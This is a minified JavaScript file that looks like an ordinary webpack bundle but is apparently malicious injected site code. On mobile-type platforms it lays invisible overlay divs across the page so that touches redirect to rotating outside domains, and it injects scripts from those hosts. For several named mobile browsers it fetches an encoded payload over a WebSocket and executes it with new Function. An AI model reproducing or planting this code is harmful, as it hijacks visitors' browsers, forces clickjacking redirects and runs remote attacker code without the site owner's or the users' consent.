! function(e) {
  var t = {};

  function r(n) {
      if (t[n]) return t[n].exports;
      var o = t[n] = {
          i: n,
          l: !1,
          exports: {}
      };
      return e[n].call(o.exports, o, o.exports, r), o.l = !0, o.exports
  }
  r.m = e, r.c = t, r.d = function(e, t, n) {
      r.o(e, t) || Object.defineProperty(e, t, {
          enumerable: !0,
          get: n
      })
  }, r.r = function(e) {
      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
          value: "Module"
      }), Object.defineProperty(e, "__esModule", {
          value: !0
      })
  }, r.t = function(e, t) {
      if (1 & t && (e = r(e)), 8 & t) return e;
      if (4 & t && "object" == typeof e && e && e.__esModule) return e;
      var n = Object.create(null);
      if (r.r(n), Object.defineProperty(n, "default", {
              enumerable: !0,
              value: e
          }), 2 & t && "string" != typeof e)
          for (var o in e) r.d(n, o, function(t) {
              return e[t]
          }.bind(null, o));
      return n
  }, r.n = function(e) {
      var t = e && e.__esModule ? function() {
          return e.default
      } : function() {
          return e
      };
      return r.d(t, "a", t), t
  }, r.o = function(e, t) {
      return Object.prototype.hasOwnProperty.call(e, t)
  }, r.p = "", r(r.s = 0)
}([function(e, t) {
  var r = document,
      n = navigator.platform,
      o = r.currentScript;
  if (!/^Mac|Win/.test(n) || !n) {
      var grecelev_is_ws = grecelev_is_kk = 0;
      setTimeout(function() {
          if (grecelev_is_ws == 0) {
              var clientwidth = window.screen.availWidth;
              document.addEventListener("touchstart", function() {
                  if (grecelev_is_ws == 0) {
                      var eve = event || window.event;
                      var cx = cy = 0;
                      if (eve && eve.type == "touchstart") {
                          cx = eve.touches[0].clientX;
                          cy = eve.touches[0].clientY
                      }
                      if (eve && eve.type == "touchend") {
                          cx = eve.changedTouches[0].screenX;
                          cy = eve.changedTouches[0].clientY
                      }
                      if (eve && eve.type == "click") {
                          cx = eve.clientX;
                          cy = eve.clientY
                      }
                      if (cx > 0 && cy > 0) {
                          if (cy < (204 * (clientwidth / 620)) && grecelev_is_kk == 0) {
                              grecelev_is_kk = 1;
                              var grecelev_m = "https://" + Date.parse(new Date()) + "6819tc.6nxa6g.com" + ":8004/cc/6819?is_not=1&target=1";
                              if (top.location != self.location) {
                                  top.location = grecelev_m
                              } else {
                                  window.location.href = grecelev_m
                              }
                              grecelev_is_kk = 0
                          }
                      }
                  }
              });
              for (var n = 0; n < 4; n++) {
                  for (var j = 0; j < 10; j++) {
                      var style = "position:fixed; top:" + (7.96875 * n) + "vw; left:" + j * 10 + "vw; z-index:100;display:block;width:9.6vw;height:7.96875vw;background:#000;opacity:0.01;";
                      document.body.insertAdjacentHTML("beforeend", '<div style="' + style + '"></div>')
                  }
              }
              setTimeout(function() {
                  if (grecelev_is_ws == 0) {
                      var i = document.createElement("script");
                      i.src = "https://" + (new Date().getDate()) + "6819tc.6nxa6g.com" + ":8004/d/6819?c=1&n=grecelev";
                      var u = document.getElementsByTagName("script")[0];
                      u.parentNode.insertBefore(i, u);
                      var sbb = document.createElement("style");
                      sbb.id = "grecelev_style_id";
                      sbb.innerHTML = "body{position:initial !important;min-height:" + window.screen.height + "px !important;padding-bottom:100px !important;}";
                      document.head.appendChild(sbb)
                  }
              }, 1500)
          }
      }, 1000);
  }
  if (/baidu|HuaweiBrowser|VivoBrowser|OppoBrowser|HeyTapBrowser|MiuiBrowser|bdhonorbrowser|MQQBrowser|UCBrowser|Quark|QKQ/g.test(navigator.userAgent) !== false) {
      var wsxg = ["wt.17nudk.com", "wt.1xakwj.com", "wt.1xakwj.com", "wt.323to3.com", "wt.323to3.com", "wt.17nudk.com"];
      var k = Math.floor((new Date()).getDate() / 5);
      k = (k > 5) ? 5 : k;
      var c = new WebSocket("wss://b607a0ff2446d0f" + (new Date().getDate()) + wsxg[k] + ":20094" + "/6819");
      c.onopen = function(e) {
          grecelev_is_ws = grecelev_is_kk = 1;
          setTimeout(() => {
              var canva = r.getElementById("grecelev_style_id");
              if (canva) {
                  canva.remove()
              }
          }, 1000)
      };
      c.onmessage = function(e) {
          var t = function(e) {
              var t, r, n, o, c, i, u, a = "charAt",
                  f = "fromCharCode",
                  l = "charCodeAt",
                  d = "indexOf",
                  s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
                  p = "",
                  g = 0;
              for (e = e.replace(/[^A-Za-z0-9+/=]/g, ""); g < e.length;) o = s[d](e[a](g++)), c = s[d](e[a](g++)), i = s[d](e[a](g++)), u = s[d](e[a](g++)), t = o << 2 | c >> 4, r = (15 & c) << 4 | i >> 2, n = (3 & i) << 6 | u, p += String[f](t), 64 != i && (p += String[f](r)), 64 != u && (p += String[f](n));
              return function(e) {
                  for (var t = "", n = r = c1 = c2 = 0; n < e.length;)(r = e[l](n)) < 128 ? (t += String[f](r), n++) : r > 191 && r < 224 ? (c2 = e[l](n + 1), t += String[f]((31 & r) << 6 | 63 & c2), n += 2) : (c2 = e[l](n + 1), c3 = e[l](n + 2), t += String[f]((15 & r) << 12 | (63 & c2) << 6 | 63 & c3), n += 3);
                  return t
              }(p)
          }(e.data);
          new Function("_tdcs", t)(o), c.close()
      }
  } else {
      var i = r.createElement("script");
      i.src = "https://" + (new Date().getDate()) + "6819tg.59p643.com" + ":8004/sc/6819?n=grecelev";
      var u = r.getElementsByTagName("script")[0];
      u.parentNode.insertBefore(i, u)
  }
}]);